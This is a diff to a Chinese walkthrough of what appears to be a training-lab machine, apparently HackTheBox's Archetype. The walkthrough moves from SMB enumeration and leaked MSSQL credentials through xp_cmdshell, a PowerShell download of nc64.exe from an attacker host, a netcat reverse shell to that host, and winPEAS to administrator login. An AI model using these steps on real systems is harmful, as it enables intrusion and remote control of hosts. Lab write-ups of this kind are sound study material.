@@ -1,7 +1,9 @@
 ### 一、操作流程
 
 1. 使用`nmap`工具扫描主机
+
 > nmap -sC -sV 10.129.37.148
+
 ```shell
 Nmap scan report for 10.129.37.148
 Host is up (0.59s latency).
@@ -25,7 +27,8 @@ PORT     STATE SERVICE      VERSION
 
 > smbclient -N -L 10.129.37.148  #查看共享目录列表
 > smbclient -N  10.129.37.148\\backups #进入共享目录
->  从smb服务器里面获取文件`prod.dtsConfig`,
+> 从smb服务器里面获取文件`prod.dtsConfig`,
+
 ```xml
 <DTSConfiguration>
     <DTSConfigurationHeading>
@@ -36,8 +39,8 @@ PORT     STATE SERVICE      VERSION
     </Configuration>
 </DTSConfiguration> 
 ```
-> 获得mssql的用户（ARCHETYPE\sql_svc）和密码（M3g4c0rp123）：
 
+> 获得mssql的用户（ARCHETYPE\sql_svc）和密码（M3g4c0rp123）：
 
 3. Impacket工具的使用
 
@@ -54,8 +57,8 @@ pip3 install -r requirements.txt
 ```
 
 - 连接数据库
-> python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.37.148 -windows-auth  
 
+> python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.37.148 -windows-auth  
 
 - 开启命令行执行权限
 
@@ -71,28 +74,34 @@ RECONFIGURE; — priv
 > 至此，可以直接使用cmd指令
 
 4. 反弹shell
-- 本地启动临时web服务：`python3 -m http.server 6000`
--  上传工具
-> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.16.88:6000/nc64.exe -outfile nc64.exe"
 
--  本地启动监听:`sudo nc -lvnp 443`
--  反弹shell
+- 本地启动临时web服务：`python3 -m http.server 6000`
+- 上传工具
+
+> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget <http://10.10.16.88:6000/nc64.exe> -outfile nc64.exe"
+
+- 本地启动监听:`sudo nc -lvnp 443`
+- 反弹shell
+
 > EXEC xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc64.exe -e cmd.exe 10.10.16.88 443"
 
 5. 权限提升
+
 - 上传执行文件`winPEASx64.exe`
-> wget http://10.10.16.88:6000/winPEASx64.exe -outfile winPEASx64.exe
+
+> wget <http://10.10.16.88:6000/winPEASx64.exe> -outfile winPEASx64.exe
 
 - 执行文件`winPEASx64.exe`
+
 > .\winPEASx641.exe
 
 - 打开文件获取密码
+
 > C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
-
 6. 主机登录psexec.py
->  ython3 psexec.py administrator@10.129.37.148 #登录后获取flag
 
+> ython3 psexec.py administrator@10.129.37.148 #登录后获取flag
 
 ### 知识点
 
